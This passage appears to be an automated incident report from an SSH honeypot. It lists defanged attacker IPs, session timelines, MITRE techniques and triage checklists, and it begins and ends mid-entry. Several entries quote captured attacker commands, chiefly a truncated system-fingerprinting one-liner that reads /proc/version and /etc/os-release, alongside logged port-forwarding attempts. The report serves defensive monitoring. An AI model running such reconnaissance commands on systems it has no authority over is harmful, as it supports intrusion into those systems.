| **First Seen** | 2026-08-05 13:52 |
| **Last Seen** | 2026-08-05 13:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:52:26` | `cowrie.session.connect` |
| `2026-08-05 13:52:26` | `cowrie.client.version` |
| `2026-08-05 13:52:26` | `cowrie.client.kex` |
| `2026-08-05 13:52:28` | `cowrie.login.success` |
| `2026-08-05 13:52:28` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:52:28` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:52:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]42` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e4748622333

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]67` |
| **First Seen** | 2026-08-05 13:52 |
| **Last Seen** | 2026-08-05 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:52:39` | `cowrie.session.connect` |
| `2026-08-05 13:52:39` | `cowrie.client.version` |
| `2026-08-05 13:52:39` | `cowrie.client.kex` |
| `2026-08-05 13:52:39` | `cowrie.login.success` |
| `2026-08-05 13:52:40` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:52:40` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]67` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbcff68368a9

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]110` |
| **First Seen** | 2026-08-05 13:52 |
| **Last Seen** | 2026-08-05 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:52:43` | `cowrie.session.connect` |
| `2026-08-05 13:52:43` | `cowrie.client.version` |
| `2026-08-05 13:52:43` | `cowrie.client.kex` |
| `2026-08-05 13:52:44` | `cowrie.login.success` |
| `2026-08-05 13:52:44` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:52:44` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:52:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]110` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06fe96a46f79

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:52 |
| **Last Seen** | 2026-08-05 13:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:52:51` | `cowrie.session.connect` |
| `2026-08-05 13:52:51` | `cowrie.client.version` |
| `2026-08-05 13:52:51` | `cowrie.client.kex` |
| `2026-08-05 13:52:51` | `cowrie.login.success` |
| `2026-08-05 13:52:53` | `cowrie.session.params` |
| `2026-08-05 13:52:53` | `cowrie.command.input` |
| `2026-08-05 13:52:53` | `cowrie.command.input` |
| `2026-08-05 13:52:53` | `cowrie.command.input` |
| `2026-08-05 13:52:53` | `cowrie.command.input` |
| `2026-08-05 13:52:53` | `cowrie.command.input` |
| `2026-08-05 13:52:53` | `cowrie.command.success` |
| `2026-08-05 13:52:53` | `cowrie.command.input` |
| `2026-08-05 13:52:53` | `cowrie.command.input` |
| `2026-08-05 13:52:53` | `cowrie.command.input` |
| `2026-08-05 13:52:53` | `cowrie.command.input` |
| `2026-08-05 13:52:53` | `cowrie.log.closed` |
| `2026-08-05 13:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08be832a892e

| Field | Detail |
|---|---|
| **Source IP** | `203.189.196[.]168` |
| **First Seen** | 2026-08-05 13:53 |
| **Last Seen** | 2026-08-05 13:58 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:53:50` | `cowrie.session.connect` |
| `2026-08-05 13:53:51` | `cowrie.client.version` |
| `2026-08-05 13:53:51` | `cowrie.client.kex` |
| `2026-08-05 13:53:54` | `cowrie.login.success` |
| `2026-08-05 13:58:54` | `cowrie.session.file_upload` |
| `2026-08-05 13:58:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.189.196[.]168` to AbuseIPDB if not already reported
- [ ] Block `203.189.196[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-909fa2991977

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]182` |
| **First Seen** | 2026-08-05 13:54 |
| **Last Seen** | 2026-08-05 13:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:54:08` | `cowrie.session.connect` |
| `2026-08-05 13:54:08` | `cowrie.client.version` |
| `2026-08-05 13:54:08` | `cowrie.client.kex` |
| `2026-08-05 13:54:08` | `cowrie.login.success` |
| `2026-08-05 13:54:09` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:54:09` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:54:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]182` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66a8df9f0238

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:54 |
| **Last Seen** | 2026-08-05 13:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:54:17` | `cowrie.session.connect` |
| `2026-08-05 13:54:17` | `cowrie.client.version` |
| `2026-08-05 13:54:17` | `cowrie.client.kex` |
| `2026-08-05 13:54:18` | `cowrie.login.success` |
| `2026-08-05 13:54:19` | `cowrie.session.params` |
| `2026-08-05 13:54:19` | `cowrie.command.input` |
| `2026-08-05 13:54:19` | `cowrie.command.input` |
| `2026-08-05 13:54:19` | `cowrie.command.input` |
| `2026-08-05 13:54:19` | `cowrie.command.input` |
| `2026-08-05 13:54:19` | `cowrie.command.input` |
| `2026-08-05 13:54:19` | `cowrie.command.success` |
| `2026-08-05 13:54:19` | `cowrie.command.input` |
| `2026-08-05 13:54:19` | `cowrie.command.input` |
| `2026-08-05 13:54:19` | `cowrie.command.input` |
| `2026-08-05 13:54:19` | `cowrie.command.input` |
| `2026-08-05 13:54:20` | `cowrie.log.closed` |
| `2026-08-05 13:54:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d637922e813

| Field | Detail |
|---|---|
| **Source IP** | `178.128.80[.]167` |
| **First Seen** | 2026-08-05 13:54 |
| **Last Seen** | 2026-08-05 13:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:54:43` | `cowrie.session.connect` |
| `2026-08-05 13:54:43` | `cowrie.client.version` |
| `2026-08-05 13:54:44` | `cowrie.client.kex` |
| `2026-08-05 13:54:44` | `cowrie.login.success` |
| `2026-08-05 13:54:45` | `cowrie.session.params` |
| `2026-08-05 13:54:45` | `cowrie.command.input` |
| `2026-08-05 13:54:46` | `cowrie.log.closed` |
| `2026-08-05 13:54:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.80[.]167` to AbuseIPDB if not already reported
- [ ] Block `178.128.80[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9858107c71e4

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]107` |
| **First Seen** | 2026-08-05 13:54 |
| **Last Seen** | 2026-08-05 13:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:54:55` | `cowrie.session.connect` |
| `2026-08-05 13:54:55` | `cowrie.client.version` |
| `2026-08-05 13:54:55` | `cowrie.client.kex` |
| `2026-08-05 13:54:56` | `cowrie.login.success` |
| `2026-08-05 13:54:56` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:54:56` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]107` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abd928dcf340

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:55 |
| **Last Seen** | 2026-08-05 13:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:55:45` | `cowrie.session.connect` |
| `2026-08-05 13:55:45` | `cowrie.client.version` |
| `2026-08-05 13:55:45` | `cowrie.client.kex` |
| `2026-08-05 13:55:45` | `cowrie.login.success` |
| `2026-08-05 13:55:46` | `cowrie.session.params` |
| `2026-08-05 13:55:46` | `cowrie.command.input` |
| `2026-08-05 13:55:46` | `cowrie.command.input` |
| `2026-08-05 13:55:46` | `cowrie.command.input` |
| `2026-08-05 13:55:46` | `cowrie.command.input` |
| `2026-08-05 13:55:46` | `cowrie.command.input` |
| `2026-08-05 13:55:46` | `cowrie.command.success` |
| `2026-08-05 13:55:46` | `cowrie.command.input` |
| `2026-08-05 13:55:46` | `cowrie.command.input` |
| `2026-08-05 13:55:46` | `cowrie.command.input` |
| `2026-08-05 13:55:46` | `cowrie.command.input` |
| `2026-08-05 13:55:46` | `cowrie.log.closed` |
| `2026-08-05 13:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9baaf1d4d67

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:57 |
| **Last Seen** | 2026-08-05 13:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:57:13` | `cowrie.session.connect` |
| `2026-08-05 13:57:13` | `cowrie.client.version` |
| `2026-08-05 13:57:13` | `cowrie.client.kex` |
| `2026-08-05 13:57:14` | `cowrie.login.success` |
| `2026-08-05 13:57:15` | `cowrie.session.params` |
| `2026-08-05 13:57:15` | `cowrie.command.input` |
| `2026-08-05 13:57:15` | `cowrie.command.input` |
| `2026-08-05 13:57:15` | `cowrie.command.input` |
| `2026-08-05 13:57:15` | `cowrie.command.input` |
| `2026-08-05 13:57:15` | `cowrie.command.input` |
| `2026-08-05 13:57:15` | `cowrie.command.success` |
| `2026-08-05 13:57:15` | `cowrie.command.input` |
| `2026-08-05 13:57:15` | `cowrie.command.input` |
| `2026-08-05 13:57:15` | `cowrie.command.input` |
| `2026-08-05 13:57:15` | `cowrie.command.input` |
| `2026-08-05 13:57:15` | `cowrie.log.closed` |
| `2026-08-05 13:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dc971e98a83

| Field | Detail |
|---|---|
| **Source IP** | `178.128.80[.]167` |
| **First Seen** | 2026-08-05 13:57 |
| **Last Seen** | 2026-08-05 13:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:57:13` | `cowrie.session.connect` |
| `2026-08-05 13:57:13` | `cowrie.client.version` |
| `2026-08-05 13:57:14` | `cowrie.client.kex` |
| `2026-08-05 13:57:15` | `cowrie.login.success` |
| `2026-08-05 13:57:16` | `cowrie.session.params` |
| `2026-08-05 13:57:16` | `cowrie.command.input` |
| `2026-08-05 13:57:16` | `cowrie.log.closed` |
| `2026-08-05 13:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.80[.]167` to AbuseIPDB if not already reported
- [ ] Block `178.128.80[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca0690c6464a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:58 |
| **Last Seen** | 2026-08-05 13:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:58:44` | `cowrie.session.connect` |
| `2026-08-05 13:58:44` | `cowrie.client.version` |
| `2026-08-05 13:58:44` | `cowrie.client.kex` |
| `2026-08-05 13:58:45` | `cowrie.login.success` |
| `2026-08-05 13:58:46` | `cowrie.session.params` |
| `2026-08-05 13:58:46` | `cowrie.command.input` |
| `2026-08-05 13:58:46` | `cowrie.command.input` |
| `2026-08-05 13:58:46` | `cowrie.command.input` |
| `2026-08-05 13:58:46` | `cowrie.command.input` |
| `2026-08-05 13:58:46` | `cowrie.command.input` |
| `2026-08-05 13:58:46` | `cowrie.command.success` |
| `2026-08-05 13:58:46` | `cowrie.command.input` |
| `2026-08-05 13:58:46` | `cowrie.command.input` |
| `2026-08-05 13:58:46` | `cowrie.command.input` |
| `2026-08-05 13:58:46` | `cowrie.command.input` |
| `2026-08-05 13:58:47` | `cowrie.log.closed` |
| `2026-08-05 13:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aa0f3f24269

| Field | Detail |
|---|---|
| **Source IP** | `159.65.138[.]39` |
| **First Seen** | 2026-08-05 13:59 |
| **Last Seen** | 2026-08-05 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:59:16` | `cowrie.session.connect` |
| `2026-08-05 13:59:16` | `cowrie.client.version` |
| `2026-08-05 13:59:17` | `cowrie.client.kex` |
| `2026-08-05 13:59:18` | `cowrie.login.success` |
| `2026-08-05 13:59:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.138[.]39` to AbuseIPDB if not already reported
- [ ] Block `159.65.138[.]39` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6597870cf579

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-05 13:59 |
| **Last Seen** | 2026-08-05 13:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:59:18` | `cowrie.session.connect` |
| `2026-08-05 13:59:18` | `cowrie.client.version` |
| `2026-08-05 13:59:18` | `cowrie.client.kex` |
| `2026-08-05 13:59:19` | `cowrie.login.success` |
| `2026-08-05 13:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-804a7d4ea617

| Field | Detail |
|---|---|
| **Source IP** | `178.128.80[.]167` |
| **First Seen** | 2026-08-05 13:59 |
| **Last Seen** | 2026-08-05 13:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:59:46` | `cowrie.session.connect` |
| `2026-08-05 13:59:46` | `cowrie.client.version` |
| `2026-08-05 13:59:47` | `cowrie.client.kex` |
| `2026-08-05 13:59:48` | `cowrie.login.success` |
| `2026-08-05 13:59:49` | `cowrie.session.params` |
| `2026-08-05 13:59:49` | `cowrie.command.input` |
| `2026-08-05 13:59:49` | `cowrie.log.closed` |
| `2026-08-05 13:59:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.80[.]167` to AbuseIPDB if not already reported
- [ ] Block `178.128.80[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b6ac2506941

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 14:00 |
| **Last Seen** | 2026-08-05 14:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:00:13` | `cowrie.session.connect` |
| `2026-08-05 14:00:13` | `cowrie.client.version` |
| `2026-08-05 14:00:13` | `cowrie.client.kex` |
| `2026-08-05 14:00:13` | `cowrie.login.success` |
| `2026-08-05 14:00:14` | `cowrie.session.params` |
| `2026-08-05 14:00:14` | `cowrie.command.input` |
| `2026-08-05 14:00:14` | `cowrie.command.input` |
| `2026-08-05 14:00:14` | `cowrie.command.input` |
| `2026-08-05 14:00:14` | `cowrie.command.input` |
| `2026-08-05 14:00:14` | `cowrie.command.input` |
| `2026-08-05 14:00:14` | `cowrie.command.success` |
| `2026-08-05 14:00:14` | `cowrie.command.input` |
| `2026-08-05 14:00:14` | `cowrie.command.input` |
| `2026-08-05 14:00:14` | `cowrie.command.input` |
| `2026-08-05 14:00:14` | `cowrie.command.input` |
| `2026-08-05 14:00:14` | `cowrie.log.closed` |
| `2026-08-05 14:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df6157a480b6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 14:01 |
| **Last Seen** | 2026-08-05 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:01:43` | `cowrie.session.connect` |
| `2026-08-05 14:01:43` | `cowrie.client.version` |
| `2026-08-05 14:01:43` | `cowrie.client.kex` |
| `2026-08-05 14:01:44` | `cowrie.login.success` |
| `2026-08-05 14:01:44` | `cowrie.session.params` |
| `2026-08-05 14:01:44` | `cowrie.command.input` |
| `2026-08-05 14:01:44` | `cowrie.command.input` |
| `2026-08-05 14:01:44` | `cowrie.command.input` |
| `2026-08-05 14:01:44` | `cowrie.command.input` |
| `2026-08-05 14:01:44` | `cowrie.command.input` |
| `2026-08-05 14:01:44` | `cowrie.command.success` |
| `2026-08-05 14:01:44` | `cowrie.command.input` |
| `2026-08-05 14:01:44` | `cowrie.command.input` |
| `2026-08-05 14:01:44` | `cowrie.command.input` |
| `2026-08-05 14:01:44` | `cowrie.command.input` |
| `2026-08-05 14:01:45` | `cowrie.log.closed` |
| `2026-08-05 14:01:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daa3f49c5aea

| Field | Detail |
|---|---|
| **Source IP** | `178.128.80[.]167` |
| **First Seen** | 2026-08-05 14:02 |
| **Last Seen** | 2026-08-05 14:02 |
| **Session Duration** | 2s |
